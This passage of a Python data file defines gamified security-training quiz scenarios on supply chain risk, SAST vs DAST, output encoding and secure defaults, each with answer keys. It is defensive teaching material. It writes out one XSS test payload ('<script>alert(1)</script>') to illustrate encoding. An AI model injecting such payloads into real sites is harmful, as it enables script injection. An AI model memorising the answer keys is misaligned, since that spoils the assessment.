"But that enchantment is from a popular public repository!" the Artificer protests.
"It has thousands of users! How could we have known?"

You note that the curse was added in a recent version update. The Citadel
automatically pulled the latest version without review.

What process should have detected this risk?
                """,
                "choices": [
                    {"text": "Only use enchantments with many users - popularity means security"},
                    {"text": "Component analysis with vulnerability scanning and integrity verification"},
                    {"text": "Manually review all external enchantment source code"},
                    {"text": "Avoid all external enchantments - only use internal ones"}
                ],
                "success_text": """
"Popularity doesn't mean security," you explain. "Popular components have been
compromised before - event-stream, ua-parser-js, colors. The more popular, the
more attractive a target."

You outline proper third-party management:

"COMPONENT INVENTORY: Know exactly what external enchantments you use. Create
a bill of materials."

"VULNERABILITY SCANNING: Check known vulnerability databases automatically.
Flag components with disclosed security issues."

"INTEGRITY VERIFICATION: Pin specific versions. Verify checksums. Detect if a
component changes unexpectedly."

"AUTOMATED MONITORING: When new vulnerabilities are disclosed, immediately know
if you're affected."

The Artificer asks, "Can we scan everything manually?"

"For 50+ dependencies? No. This requires automated tools - Software Composition
Analysis. They maintain vulnerability databases and continuously scan your
inventory."

You implement SCA scanning in the artifact creation pipeline.

You have demonstrated THIRD-PARTY SOFTWARE RISK management.
                """,
                "failure_texts": {
                    0: """
Popularity doesn't indicate security. Popular packages are high-value targets.
Event-stream had millions of downloads when it was compromised. Popularity
means more eyes (sometimes good) but also more attacker interest. Systematic
scanning and integrity verification are required regardless of popularity.
                    """,
                    2: """
Manual review doesn't scale. With dozens of dependencies, each with their own
dependencies, you might have hundreds of external components. Manual review of
all source code is infeasible. Automated Software Composition Analysis tools
maintain vulnerability databases and scan continuously - what humans cannot do.
                    """,
                    3: """
Avoiding external components is impractical. You'd reinvent everything from
scratch - authentication, encryption, parsing, networking. You'd likely create
MORE vulnerabilities than battle-tested external libraries contain. The answer
is proper management (scanning, verification, monitoring), not avoidance.
                    """
                }
            },
            "corporate": {
                "title": "THE COMPROMISED LIBRARY",
                "narrative": """
The development team uses 50 open-source packages from npm. A security alert
reveals that one package, used across 12 applications, was compromised - a
malicious maintainer pushed a version that exfiltrates environment variables.

"We trusted that package!" the developer says. "It has a million downloads!"

Investigation shows the malicious version was published three weeks ago. Your
applications have been leaking secrets ever since.

What process should have detected this before deployment?
                """,
                "choices": [
                    {"text": "Only use packages with more than a million downloads"},
                    {"text": "Software Composition Analysis with vulnerability and integrity checking"},
                    {"text": "Manually read all source code of every dependency"},
                    {"text": "Write everything in-house to avoid third-party code"}
                ],
                "success_text": """
"Download counts don't indicate security," you explain. "This package HAD a
million downloads - and was still compromised. Let me show you proper third-party
risk management."

You outline the solution:

"SOFTWARE COMPOSITION ANALYSIS (SCA): Tools that scan your dependencies against
vulnerability databases. When a vulnerability is disclosed, you're alerted immediately."

"INTEGRITY VERIFICATION: Lock file exact versions. Verify package checksums.
Detect unexpected changes."

"DEPENDENCY MONITORING: Services that watch your bill of materials and alert on
new vulnerabilities in components you use."

"MINIMAL DEPENDENCIES: Use only what you need. Every dependency is attack surface."

The developer asks, "How do we handle 50 packages?"

"Automation. SCA tools scan your package-lock.json and check every dependency,
including transitive ones. The compromised package would have triggered alerts
when its behavior changed unexpectedly."

You implement SCA in the CI/CD pipeline. New vulnerabilities are caught before merge.

You have demonstrated THIRD-PARTY SOFTWARE RISK management.
                """,
                "failure_texts": {
                    0: """
Download popularity doesn't equal security. High-download packages are valuable
targets for attackers. The event-stream package had millions of downloads when
attackers compromised it to steal cryptocurrency. Systematic scanning and
monitoring are required regardless of popularity metrics.
                    """,
                    2: """
Manual review doesn't scale. Your 50 direct dependencies have their own
dependencies - you might have 500+ total packages. Reading all source code is
impossible. Software Composition Analysis tools automate this by checking
against known vulnerability databases and detecting suspicious changes.
                    """,
                    3: """
Writing everything in-house creates MORE risk. You'd implement cryptography,
authentication, and other security-critical code from scratch. Your implementations
would have more vulnerabilities than battle-tested libraries. The answer is
proper third-party management, not avoidance.
                    """
                }
            }
        },
        "correct_index": 1,
        "xp_reward": 75,
        "hp_penalty": 25,
        "failure_text": """
Third-party software introduces supply chain risk. Managing this requires:
(1) SOFTWARE COMPOSITION ANALYSIS (SCA) tools that scan dependencies against
vulnerability databases, (2) INTEGRITY VERIFICATION with locked versions and
checksums, (3) DEPENDENCY MONITORING for newly disclosed vulnerabilities,
(4) MINIMAL DEPENDENCIES to reduce attack surface. Popularity doesn't indicate
security - popular packages are high-value targets. Manual review doesn't scale.
Avoiding third-party code entirely isn't practical. Systematic management is required.
        """,
        "domain_reference": "Domain 8: Software Development Security - Third-Party Risk"
    },

    # Scenario 15: Supply Chain Security
    {
        "id": "d8_supply_chain",
        "domain": 8,
        "themes": {
            "fantasy": {
                "title": "THE CORRUPTED TOOLS",
                "narrative": """
The kingdom uses enchanted forge tools provided by a renowned dwarven smith. These
tools are used to create every magical artifact in the realm.

News arrives that the dwarven forge was compromised. Attackers modified the tools
to add hidden weaknesses to every artifact created with them. Thousands of artifacts
across dozens of kingdoms are now vulnerable.

"But we inspected our raw materials and our finished artifacts!" the Forge Master
protests. "How could the TOOLS be the problem?"

What type of attack is this, and what is a KEY defense?
                """,
                "choices": [
                    {"text": "DDoS attack - implement redundant forges"},
                    {"text": "Supply chain attack - verify tool integrity and use signed releases"},
                    {"text": "Phishing attack - train the forge workers"},
                    {"text": "Insider threat - conduct background checks on smiths"}
                ],
                "success_text": """
"This is a SUPPLY CHAIN attack," you explain. "The attacker didn't target individual
artifacts - they targeted the TOOLS used to create artifacts. Every artifact made
with the compromised tools is affected."

"This is devastating because one compromise propagates to everything downstream.
The SolarWinds attack worked this way - they compromised the build system, not
individual products."

The Forge Master asks, "How do we defend against this?"

"Multiple layers:
1. VERIFY TOOL INTEGRITY - Check signatures before using any tool or update
2. USE SIGNED RELEASES - Only accept tools with valid cryptographic signatures
3. PIN VERSIONS - Don't automatically update; review changes first
4. MONITOR FOR CHANGES - Detect when tools behave differently than expected
5. DIVERSE SUPPLIERS - Don't depend on a single tool source for everything"

You implement tool verification procedures and integrity monitoring.

You have identified a SUPPLY CHAIN ATTACK and its defenses.
                """,
                "failure_texts": {
                    0: """
DDoS attacks prevent access to services. This attack inserted malicious
functionality into creation tools. The tools worked perfectly - that's why
no one noticed. Supply chain attacks compromise the creation process, not
the availability of services.
                    """,
                    2: """
Phishing attacks trick people into revealing information or taking actions.
This attack compromised the tools themselves, regardless of human action.
Even the most alert workers would use compromised tools unknowingly. Supply
chain security focuses on verifying tool and component integrity.
                    """,
                    3: """
This was an external attack on the tool vendor, not an insider threat within
your organization. Background checks on your staff wouldn't have prevented
the dwarven forge from being compromised. Supply chain security requires
verifying integrity of all external tools and dependencies.
                    """
                }
            },
            "corporate": {
                "title": "THE SOLARWINDS LESSON",
                "narrative": """
A widely-used network monitoring tool was compromised at its vendor. Attackers
inserted a backdoor into the build process. Every organization that updated to
the new version received the backdoor - including government agencies and major
corporations.

Your CISO asks: "We use similar tools from third parties. How do we prevent
becoming the next victim?"

The security team notes that you rely on dozens of third-party tools for
development, monitoring, and operations.

What type of attack is this, and what is a KEY defense?
                """,
                "choices": [
                    {"text": "DDoS attack - implement failover systems"},
                    {"text": "Supply chain attack - verify integrity of all tools and use signed releases"},
                    {"text": "Phishing attack - improve user awareness training"},
                    {"text": "Insider threat - conduct background checks on employees"}
                ],
                "success_text": """
"SolarWinds was a supply chain attack," you explain. "Attackers didn't target
individual organizations - they compromised the vendor's build process. Everyone
who updated became a victim."

"The terrifying part: the source code was clean. The backdoor was added DURING
the build. Traditional security review couldn't detect it."

You outline defenses:

"1. VERIFY INTEGRITY: Check cryptographic signatures on all tools and updates
2. PIN VERSIONS: Don't auto-update. Review changelogs. Test before deploying
3. BEHAVIORAL MONITORING: Detect when trusted tools behave unexpectedly
4. ZERO TRUST: Treat even trusted tools as potential threats. Limit their access
5. BILL OF MATERIALS: Know exactly what third-party code you run. Monitor for
   vulnerabilities in your supply chain"

The CISO asks, "Can we just avoid third-party tools?"

"No - that's impractical. But we can verify, monitor, and limit trust. Every
tool is a potential attack vector. Treat them accordingly."

You have identified a SUPPLY CHAIN ATTACK and its defenses.
                """,
                "failure_texts": {
                    0: """
DDoS prevents access to services. The SolarWinds attack added malicious
functionality that worked alongside legitimate features. Services remained
available - that's how it stayed hidden for months. Supply chain attacks
compromise integrity, not availability.
                    """,
                    2: """
No amount of phishing training prevents supply chain attacks. The update came
through legitimate channels from a trusted vendor. Users did nothing wrong by
installing it. Supply chain security requires verifying tool integrity, not
just training users to avoid suspicious emails.
                    """,
                    3: """
Background checks on your employees couldn't prevent a vendor from being
compromised. SolarWinds' own developers were (presumably) thoroughly vetted.
The attack came from outside. Supply chain security focuses on verifying
integrity of external components and tools.
                    """
                }
            }
        },
        "correct_index": 1,
        "xp_reward": 75,
        "hp_penalty": 25,
        "failure_text": """
Supply chain attacks compromise software vendors, build tools, or dependencies
to attack downstream users. One compromise affects every organization that uses
the affected component. Defenses include: (1) VERIFY INTEGRITY of all tools with
cryptographic signatures, (2) PIN VERSIONS rather than auto-updating, (3) MONITOR
BEHAVIOR of trusted tools for anomalies, (4) MAINTAIN BILL OF MATERIALS to know
your dependencies, (5) LIMIT TRUST even for trusted tools. SolarWinds demonstrated
that trusted vendors can be compromised.
        """,
        "domain_reference": "Domain 8: Software Development Security - Supply Chain Security"
    },

    # Scenario 16: SAST vs DAST
    {
        "id": "d8_sast_dast",
        "domain": 8,
        "themes": {
            "fantasy": {
                "title": "THE TWO INSPECTORS",
                "narrative": """
The Citadel employs two types of artifact inspectors. The first reads enchantment
scrolls and identifies potential flaws in the spell patterns without casting them.
The second casts the enchantments in a protected chamber and observes their actual
behavior.

An apprentice asks: "What are these inspection methods called, and how do they
differ?"

One inspector examines spell scrolls. The other tests running enchantments.
                """,
                "choices": [
                    {"text": "Running enchantments: Static Analysis; Scrolls: Dynamic Analysis"},
                    {"text": "Running enchantments: Dynamic Analysis; Scrolls: Static Analysis"},
                    {"text": "Both are called Static Analysis"},
                    {"text": "Both are called Penetration Testing"}
                ],
                "success_text": """
"The terms describe what is being analyzed," you explain.

"STATIC ANALYSIS examines code WITHOUT executing it. Like reading a spell scroll
and identifying flawed sigils before casting. Fast, thorough coverage, catches
many issues early - but may miss problems that only manifest at runtime."

"DYNAMIC ANALYSIS tests RUNNING applications. Like casting a spell in a chamber
and observing its actual behavior. Finds runtime issues, configuration problems,
and real attack vectors - but only tests what it actually executes."

The apprentice asks, "Which is better?"

"Neither. They're complementary. Static analysis catches issues in the entire
codebase quickly. Dynamic analysis catches issues that only appear during
execution. Use BOTH for comprehensive coverage."

"In security terms: SAST (Static Application Security Testing) and DAST
(Dynamic Application Security Testing). Your security testing should include both."

You have explained the difference between STATIC and DYNAMIC analysis.
                """,
                "failure_texts": {
                    0: """
This reverses the definitions. STATIC analysis examines code without running it.
DYNAMIC analysis tests running applications. "Static" = stationary/not executing.
"Dynamic" = moving/executing. SAST scans source code; DAST tests running apps.
                    """,
                    2: """
They are fundamentally different approaches. Static analysis examines source code
without execution - like reviewing blueprints. Dynamic analysis tests running
applications - like inspecting a finished building. Both are valuable. Both are
different. Using only one leaves gaps.
                    """,
                    3: """
Penetration testing is a broader term for simulating attacks. SAST and DAST are
specific automated testing types. DAST is somewhat similar to automated pen
testing, but SAST is quite different - it analyzes code rather than attacking
running systems. The terms describe the testing methodology, not just the goal.
                    """
                }
            },
            "corporate": {
                "title": "THE TESTING CONFUSION",
                "narrative": """
The security team is implementing automated security testing. A junior analyst
asks about tools: "I see some tools scan source code and others send requests
to running applications. What's the difference?"

The senior analyst explains that one tool type is for 'static' testing and
another for 'dynamic' testing, but the junior is still confused.

Help clarify: A tool that analyzes SOURCE CODE without running it is what type?
A tool that sends requests to a RUNNING APPLICATION is what type?
                """,
                "choices": [
                    {"text": "Running application: SAST; Source code: DAST"},
                    {"text": "Running application: DAST; Source code: SAST"},
                    {"text": "Both are called SAST"},
                    {"text": "Both are called penetration testing"}
                ],
                "success_text": """
"Let me clarify the terminology," you tell the junior analyst.

"SAST - Static Application Security Testing - analyzes source code WITHOUT
executing it. Think of it as reading the blueprints. It finds issues like:
insecure coding patterns, hardcoded secrets, vulnerable function calls."

"DAST - Dynamic Application Security Testing - tests RUNNING applications by
sending requests and analyzing responses. Think of it as testing a live building.
It finds issues like: authentication bypasses, configuration errors, injection
vulnerabilities in runtime."

"The key word is in the name: STATIC means not moving (code analysis). DYNAMIC
means moving (running application)."

The junior asks, "Which should we use?"

"Both. SAST catches issues early in development - immediate feedback to developers.
DAST catches runtime issues that SAST can't see. They complement each other.
Neither alone is sufficient."

You have explained the difference between SAST and DAST.
                """,
                "failure_texts": {
                    0: """
This reverses the definitions. Think about the words: STATIC means stationary,
not running. DAST = Dynamic = moving = running application. SAST = Static =
still = source code analysis. SAST scans code; DAST tests running apps.
                    """,
                    2: """
SAST and DAST are distinct testing types. SAST analyzes code without execution.
DAST tests running applications. They find different types of issues. Using
only one approach leaves significant gaps. A comprehensive security testing
program uses both.
                    """,
                    3: """
Penetration testing is manual attack simulation by security professionals.
SAST and DAST are automated scanning tools. While DAST resembles automated
pen testing, SAST is fundamentally different - it's code analysis, not attack
simulation. The terms describe specific testing methodologies.
                    """
                }
            }
        },
        "correct_index": 1,
        "xp_reward": 75,
        "hp_penalty": 25,
        "failure_text": """
SAST (Static Application Security Testing) analyzes SOURCE CODE without executing
it. It identifies vulnerable patterns, insecure functions, and coding errors by
examining the code itself. DAST (Dynamic Application Security Testing) tests
RUNNING APPLICATIONS by sending requests and analyzing responses. It finds runtime
vulnerabilities, configuration issues, and real attack vectors. The names reflect
the approach: Static = not running; Dynamic = running. Both are essential for
comprehensive security testing - they find different types of issues.
        """,
        "domain_reference": "Domain 8: Software Development Security - SAST vs DAST"
    },

    # Scenario 17: Output Encoding
    {
        "id": "d8_output_encoding",
        "domain": 8,
        "themes": {
            "fantasy": {
                "title": "THE DISPLAYED RUNES",
                "narrative": """
The Citadel's message board displays citizen messages on the great hall wall.
A prankster submitted a message containing spell-runes: '<fire>ignite</fire>'

When displayed, the runes executed, briefly setting the wall on fire. No one
was hurt, but the potential for harm is clear.

"We need to prevent spell-runes from executing when displayed," says the Scribe
Master. "How should we handle the < and > rune-brackets in displayed content?"
                """,
                "choices": [
                    {"text": "Remove all bracket characters from messages"},
                    {"text": "Convert < to display-rune '&lt;' and > to '&gt;' when rendering"},
                    {"text": "Display messages inside hidden spell-dampening fields"},
                    {"text": "Use JavaScript to process the messages client-side"}
                ],
                "success_text": """
"The solution is OUTPUT ENCODING," you explain. "When we display a message, we
transform special characters into their safe display equivalents."

"The spell-bracket '<' becomes the display-rune '&lt;'. The closing '>' becomes
'&gt;'. Now when someone views the message, they see the LITERAL CHARACTERS
< and > as text - they don't execute as spell commands."

You demonstrate:
Original: <fire>ignite</fire>
Displayed: &lt;fire&gt;ignite&lt;/fire&gt;

"The reader sees '<fire>ignite</fire>' on the wall, but it's just TEXT. No spell
executes."

The Scribe Master asks, "Why not just remove the brackets?"

"Because legitimate messages might discuss spells. A scholar might want to explain
'<fire> is dangerous' - removing brackets breaks their meaning. Encoding PRESERVES
content while preventing execution."

You have demonstrated OUTPUT ENCODING for XSS prevention.
                """,
                "failure_texts": {
                    0: """
Removing characters breaks legitimate content. What if someone wants to discuss
spell syntax? What about mathematical expressions using < and >? Stripping
characters is heavy-handed and loses information. ENCODING preserves the content
while preventing execution.
                    """,
                    2: """
"Hidden" fields don't prevent execution - they just hide it from view. The spell
would still run, just invisibly. Security isn't about hiding problems; it's about
preventing them. Output encoding transforms dangerous characters so they CAN'T
execute, regardless of visibility.
                    """,
                    3: """
Client-side processing doesn't prevent XSS - it often ENABLES it. If malicious
content reaches the client unencoded, it can execute. XSS prevention requires
SERVER-SIDE output encoding before content is sent to clients. Never rely on
client-side JavaScript for security.
                    """
                }
            },
            "corporate": {
                "title": "THE USER COMMENTS",
                "narrative": """
The website displays user comments. A test reveals that typing '<script>alert(1)</script>'
in a comment causes the script to execute when the page is viewed.

"The comment should just display as text, not run as code!" says the developer.

How should the application handle special characters like < and > when displaying
user-generated content to prevent XSS?
                """,
                "choices": [
                    {"text": "Strip all < and > characters from user input"},
                    {"text": "HTML-encode output: convert < to &lt; and > to &gt;"},
                    {"text": "Hide user comments in display:none elements"},
                    {"text": "Use client-side JavaScript to sanitize content"}
                ],
                "success_text": """
"The fix is OUTPUT ENCODING," you explain. "When rendering user content to HTML,
we encode special characters as their HTML entity equivalents."

You show the transformation:
Input: <script>alert(1)</script>
Output HTML: &lt;script&gt;alert(1)&lt;/script&gt;

"The browser sees '&lt;' and displays the literal character '<'. It doesn't
interpret it as an HTML tag. The script tag is VISIBLE as text, not EXECUTABLE
as code."

The developer asks, "Why not just strip the characters?"

"Because users might legitimately discuss code. A programming forum needs to show
'<html>' without executing it. Encoding preserves the content while preventing
execution."

"Also, use context-appropriate encoding: HTML encoding for HTML context, JavaScript
encoding for JS context, URL encoding for URLs. The encoding must match where the
content is rendered."

You have demonstrated OUTPUT ENCODING for XSS prevention.
                """,
                "failure_texts": {
                    0: """
Stripping characters breaks legitimate content. Tech forums need to display code
snippets. Users might discuss HTML, XML, or other angle-bracket syntax. Removing
characters is destructive. ENCODING preserves content while preventing execution.
                    """,
                    2: """
CSS display:none doesn't prevent execution - it only hides the element visually.
The script still runs; you just don't see the output. XSS prevention requires
preventing execution entirely, not hiding its effects. Output encoding
transforms the content so it CAN'T execute.
                    """,
                    3: """
Client-side sanitization is too late - the malicious content has already reached
the browser. Attackers can disable JavaScript or modify it. XSS prevention must
happen SERVER-SIDE through output encoding before content is sent. Never trust
client-side security for sensitive operations.
                    """
                }
            }
        },
        "correct_index": 1,
        "xp_reward": 75,
        "hp_penalty": 25,
        "failure_text": """
Output encoding is essential for XSS prevention. When displaying user-generated
content, special characters must be converted to safe equivalents: < becomes &lt;,
> becomes &gt;, & becomes &amp;, etc. This ensures content is displayed as TEXT,
not interpreted as CODE. Use context-appropriate encoding: HTML encoding for HTML,
JavaScript encoding for JS strings, URL encoding for URLs. Never strip characters
(breaks legitimate content) or rely on client-side sanitization (too late). Encode
on the server before rendering.
        """,
        "domain_reference": "Domain 8: Software Development Security - Output Encoding"
    },

    # Scenario 18: Secure Configuration
    {
        "id": "d8_secure_config",
        "domain": 8,
        "themes": {
            "fantasy": {
                "title": "THE WIZARD'S DEFAULTS",
                "narrative": """
A new apprentice wizard has deployed a messaging crystal for the Council. You
perform a security review and find concerning defaults:

- Administrator access uses password 'admin123' (the vendor default)
- Debugging spells are active (showing internal workings to anyone)
- Error messages reveal the crystal's internal structure
- All features are enabled, including many the Council doesn't use

"But it works!" the apprentice protests. "Why should I change the defaults if
everything functions?"

What security principle was violated here?
                """,
                "choices": [
                    {"text": "Principle of least privilege - the apprentice has too much access"},
                    {"text": "Secure by default - applications should ship in a hardened state"},
                    {"text": "Defense in depth - there aren't enough security layers"},
                    {"text": "Separation of duties - one person did everything"}
                ],
                "success_text": """
"The principle violated is SECURE BY DEFAULT," you explain. "Applications should
ship in a HARDENED state - minimal permissions, debugging disabled, strong
credentials required."

You address each issue:

"DEFAULT CREDENTIALS: The vendor ships with 'admin123' so buyers can access the
device. But leaving this unchanged is a critical vulnerability. Secure systems
require CHANGING defaults immediately."

"DEBUG MODE: Helpful for development, dangerous in production. Exposes internal
details attackers can exploit. Should be OFF by default."

"VERBOSE ERRORS: Stack traces help developers but also help attackers understand
your system. Production should show user-friendly messages, not technical details."

"UNUSED FEATURES: Each enabled feature is attack surface. If you don't need it,
disable it. Minimum necessary functionality."

The apprentice asks, "So I need to harden everything?"

"Exactly. Never assume defaults are secure. They're for convenience, not security."

You have identified a SECURE BY DEFAULT violation.
                """,
                "failure_texts": {
                    0: """
Least privilege concerns who has access to what. This issue is about HOW the
system was configured at deployment - default credentials, debug mode enabled,
excessive features. The system was deployed in its insecure default state.
That's a secure-by-default issue.
                    """,
                    2: """
Defense in depth is about multiple security layers. This issue is about the
system's base configuration - default passwords, debugging enabled, everything
turned on. Even with multiple layers, a system with default admin credentials
is compromised. The configuration itself needs hardening.
                    """,
                    3: """
Separation of duties divides responsibilities among people. This issue is about
the system's initial configuration being insecure. Even with proper duty
separation, deploying a system with default credentials and debug mode violates
secure-by-default principles.
                    """
                }
            },
            "corporate": {
                "title": "THE PRODUCTION DEPLOYMENT",
                "narrative": """
A new web application was rushed to production. Security review reveals:

- Admin login: admin / admin (default credentials)
- Debug mode: Enabled (full stack traces visible)
- Error pages: Show database connection strings
- Features: Everything enabled, including unused admin tools

"We'll harden it after launch," says the developer. "Right now it just needs
to work."

What security principle was violated by deploying with these defaults?
                """,
                "choices": [
                    {"text": "Principle of least privilege"},
                    {"text": "Secure by default / Secure configuration"},
                    {"text": "Defense in depth"},
                    {"text": "Separation of duties"}
                ],
                "success_text": """
"This violates SECURE BY DEFAULT," you explain. "Applications should be deployed
in a hardened state, not 'we'll fix it later.'"

You address the violations:

"DEFAULT CREDENTIALS: admin/admin is scanned by automated attackers constantly.
Within hours of deployment, bots will try these credentials. Require strong,
unique passwords BEFORE deployment."

"DEBUG MODE: Stack traces tell attackers exactly what frameworks you use, file
paths, database queries - everything needed to craft attacks. NEVER in production."

"VERBOSE ERRORS: Connection strings in error messages? That's giving attackers
your database credentials. Production errors should be generic."

"UNUSED FEATURES: Each enabled feature is attack surface. Admin tools you don't
use? Disable them. Less attack surface means fewer ways in."

The developer asks, "But we need to launch quickly..."

"An insecure launch is worse than a delayed launch. 'We'll harden it later' usually
means 'we'll harden it after the breach.'"

You have identified a SECURE BY DEFAULT violation.
                """,
                "failure_texts": {
                    0: """
Least privilege concerns access permissions. This issue is about deploying
with insecure default configuration - default passwords, debug mode, excessive
features. Even with proper access controls, default credentials allow anyone in.
The configuration itself is the problem.
                    """,
                    2: """
Defense in depth is multiple security layers. This issue is about the base
configuration being insecure. Even with layers, an application with admin/admin
credentials is compromised. You must fix the foundation (secure configuration)
before layers matter.
                    """,
                    3: """
Separation of duties divides responsibilities. This issue is about insecure
defaults at deployment. Even with proper duty separation, the deployed system
has default credentials and debug mode. The configuration needs hardening
regardless of who does what.
                    """
                }
            }
        },
        "correct_index": 1,
        "xp_reward": 75,
        "hp_penalty": 25,
        "failure_text": """
Secure by Default means applications should ship in a hardened state, requiring
explicit action to REDUCE security rather than to establish it. This includes:
(1) NO DEFAULT CREDENTIALS - require strong passwords on first access,
(2) DEBUGGING DISABLED - stack traces help attackers,
(3) MINIMAL FEATURES - disable what isn't needed,
(4) RESTRICTIVE PERMISSIONS - start locked down.
"We'll harden it later" usually means "we'll harden it after the breach."
Security configuration must happen BEFORE deployment.
        """,
        "domain_reference": "Domain 8: Software Development Security - Secure Configuration"
    }
]
